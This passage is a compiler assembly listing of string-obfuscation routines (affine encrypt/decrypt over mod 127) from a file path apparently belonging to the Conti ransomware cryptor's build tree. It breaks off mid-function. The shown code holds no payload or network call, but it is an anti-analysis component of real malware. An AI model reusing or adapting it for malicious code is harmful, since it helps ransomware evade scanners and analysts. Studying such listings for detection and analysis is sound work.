?isDecrypted@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 64 00 00 00	 mov	 ecx, 100		; 00000064H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00013	41 c1 e0 03	 shl	 r8d, 3

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 25	 imul	 r8d, eax, 37		; 00000025H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 64	 add	 r8d, 100		; 00000064H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 5b	 sub	 eax, 91			; 0000005bH
  00006	44 6b c0 07	 imul	 r8d, eax, 7

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6d	 imul	 r8d, eax, 109		; 0000006dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5b	 add	 r8d, 91			; 0000005bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 44 00 00 00	 mov	 ecx, 68			; 00000044H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2c	 imul	 r8d, ecx, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 65	 imul	 r8d, eax, 101		; 00000065H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 44	 add	 r8d, 68			; 00000044H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 73	 sub	 eax, 115		; 00000073H
  00006	44 6b c0 33	 imul	 r8d, eax, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 17	 add	 eax, 23
  00006	44 8d 04 80	 lea	 r8d, DWORD PTR [rax+rax*4]
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
